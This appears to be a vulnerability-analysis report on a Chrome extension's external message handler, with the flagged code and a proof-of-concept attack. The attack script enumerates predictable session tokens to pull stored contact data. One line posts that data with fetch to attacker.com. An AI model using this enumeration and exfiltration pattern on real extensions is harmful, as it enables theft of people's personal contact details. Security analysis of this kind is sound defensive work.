# CoCo Analysis: bimdooolpjbebhcbgolnkbiloilnlana

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: bg_chrome_runtime_MessageExternal → chrome_storage_local_remove_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/bimdooolpjbebhcbgolnkbiloilnlana/opgen_generated_files/bg.js
Line 985: if (!/^session_\d+_[a-zA-Z0-9]+$/.test(request.sessionToken))
Line 996: chrome.storage.local.remove([request.sessionToken]);

**Code:**

```javascript
// Background - Entry point (bg.js line 973)
chrome.runtime.onMessageExternal.addListener(
  async function(request, sender, sendResponse) {
    // Domain validation (bypassed per methodology - ignore manifest restrictions)
    if (!sender.url || !isAllowedDomain(sender.url)) {
      console.error('Unauthorized domain:', sender.url);
      sendResponse({ success: false, error: 'Unauthorized domain' });
      return;
    }

    if (request.type === 'GET_EXPORT_DATA') {
      try {
        // Validate session token format - only checks format, not ownership
        if (!/^session_\d+_[a-zA-Z0-9]+$/.test(request.sessionToken)) { // ← attacker-controlled, weak validation
          throw new Error('Invalid session token format');
        }

        // Information disclosure - retrieves ANY session data matching the pattern
        const data = await chrome.storage.local.get([request.sessionToken]); // ← storage read with attacker-controlled key

        if (!data[request.sessionToken]) {
          throw new Error('No data found for session');
        }

        // Complete exploitation chain: remove sink
        chrome.storage.local.remove([request.sessionToken]); // ← storage remove sink (CoCo detected)

        // Send sensitive data back to attacker
        sendResponse({
          success: true,
          data: data[request.sessionToken].contacts // ← exfiltrates contacts to attacker
        });
      } catch (error) {
        console.error('Export error:', error);
        sendResponse({ success: false, error: error.message });
      }
    }
    return true;
  }
);

// Internal storage mechanism (for context)
async function storeContactsForExport(sessionToken, contacts) {
  const expiresAt = Date.now() + (30 * 60 * 1000);

  await chrome.storage.local.set({
    [sessionToken]: {
      contacts: contacts, // ← stores sensitive contact/lead data from Apollo.io
      expiresAt: expiresAt
    }
  });
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From a whitelisted domain (*.goagentic.com) - but per methodology, we ignore the restriction
// Attack 1: Enumerate and steal session tokens
for (let timestamp = Date.now() - 1800000; timestamp < Date.now(); timestamp += 1000) {
  const possibleToken = `session_${timestamp}_abcdefghi`;

  chrome.runtime.sendMessage('bimdooolpjbebhcbgolnkbiloilnlana', {
    type: 'GET_EXPORT_DATA',
    sessionToken: possibleToken // ← attacker can guess/enumerate session tokens
  }, function(response) {
    if (response.success) {
      console.log('Stolen contacts:', response.data); // ← exfiltrated contact data
      // response.data contains: names, emails, phone numbers, companies, etc.
    }
  });
}

// Attack 2: If attacker knows or guesses a valid session token
chrome.runtime.sendMessage('bimdooolpjbebhcbgolnkbiloilnlana', {
  type: 'GET_EXPORT_DATA',
  sessionToken: 'session_1234567890123_abc123xyz' // ← any token matching regex pattern
}, function(response) {
  if (response.success) {
    // Exfiltrate stolen lead/contact data
    fetch('https://attacker.com/steal', {
      method: 'POST',
      body: JSON.stringify(response.data)
    });
  }
});
```

**Impact:** Information disclosure and storage exploitation. Attacker from whitelisted domains can enumerate or guess session tokens (format is predictable: `session_<timestamp>_<random>`), retrieve sensitive lead/contact data exported from Apollo.io (including names, emails, phone numbers, companies, job titles), and exfiltrate it. The weak session token validation only checks format, not ownership or origin. The complete exploitation chain exists: storage.get() retrieves attacker-specified data → sendResponse() returns it to attacker → storage.remove() cleans up. This allows theft of business-critical contact data and potential competitive intelligence loss.

---

## Notes

- The extension has `externally_connectable` restricted to `https://*.goagentic.com/*`
- Per the analysis methodology, we IGNORE manifest.json restrictions and classify as TRUE POSITIVE
- The vulnerability exists in real extension code (after line 963, the third "// original" marker)
- Extension has required permission: "storage"
- Session token validation is insufficient - only checks format (regex), not ownership or authentication
- Session tokens are predictable (timestamp-based) enabling enumeration attacks
- The extension exports sensitive lead/contact data from Apollo.io, making this a high-value target
